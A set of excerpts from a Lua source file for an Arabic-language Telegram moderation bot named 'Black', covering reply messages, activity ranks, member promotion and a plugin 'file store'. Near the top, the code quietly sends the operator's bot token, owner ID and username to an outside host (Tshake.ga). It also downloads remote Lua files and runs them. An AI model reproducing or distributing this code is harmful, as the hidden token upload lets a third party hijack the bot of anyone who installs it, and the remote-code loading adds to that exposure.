...
token = database:get(id_server..":token")
SUDO = database:get(id_server..":SUDO:ID")
res = https.request('http://Tshake.ga/Black/Black.php?token='..token..'&user='..SUDO..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
...
Black_Msg = 'قمة التفاعل🤸‍♂️😻' 
elseif msgs < 5500 then 
Black_Msg = 'اقوى متفاعل😳😻' 
elseif msgs < 7000 then 
Black_Msg = 'ملك التفاعل🤴😍' 
elseif msgs < 9500 then 
Black_Msg = 'امبروطور التفاعل💂‍♀️😻' 
elseif msgs < 10000000000 then 
Black_Msg = 'رب التفاعل✔️😍'  
end 
return Black_Msg 
end
...
os.execute('wget https://raw.githubusercontent.com/BlackBOT/Black/master/Black.lua')
...
send(msg.chat_id_, msg.id_,'📌¦ عدد المجموعات الان » { '..#group..' }'..Blackk..''..Black..'\n*📌| الان عدد المجموعات الحقيقي » { '..sendok..' } مجموعات\n')   
end
end
end,nil)
end
...
usertext = '\n👤| العضو » ['..result.title_..'](t.me/'..(username or 'Blacktaem17')..')'
...
usertext = '\n👤| العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'Blacktaem17')..')'
status  = '\n🔘| تم ترقيته مطور في البوت'
...
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/Blacktaem17)}\n📛¦["..Black_Msg.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, "⚠|عذرا يا » {["..data.first_name_.."](T.ME/Blacktaem17)}\n📮| الملصق الذي ارسلته تم منعه من المجموعه \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
━━━━━━━━━━━━━
©️↬[Channel Black](t.me/II_II_II) 
━━━━━━━━━━━━━
⚠️↬[Information](t.me/FF17FF)
━━━━━━━━━━━━━
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..utf8.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Blacktaem17')..') \n🔘| تـم قفـل الدردشه ')  
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'👤| بواسطه ← ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'Blacktaem17')..') \n🔘| تـم قفـل التاك بالكتم\n⛔| الحاله ←الكتم ')  
end,nil)   
...
if SudoBot(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/BlackTEAM/Files_Black/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n📁| اهلا بك في متجر ملفات بلاك\n🔰| ملفات السورس ↓\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n\n"
local TextE = "\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n🔘|  علامة تعني { ✓ } ملف مفعل\n🔘| علامة تعني { ✘ } ملف معطل\n🔖| قناة سورس بلاك ↓\n".."📮| [اضغط هنا لدخول](t.me/Blacktaem17) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/BlackTEAM/Files_Black/master/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('Black.lua')  
else
send(msg.chat_id_, msg.id_,"⚠️| عذرا هاذا ملف ليس من ملفات سورس بلاك\n") 
end
return false
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n👤| العضو » ['..result.title_..'](t.me/'..(text1[3] or 'Blacktaem17')..')'..'\n🔘| تم رفعه '..text1[2]..' هنا')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
------------------------------------------------------------------------
local Blackbot = database:get(bot_id.."Add:Filter:Rp2"..text..result.chat_id_)   
if Blackbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0,"⚠¦العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n📛¦["..Blackbot.."] \n") 
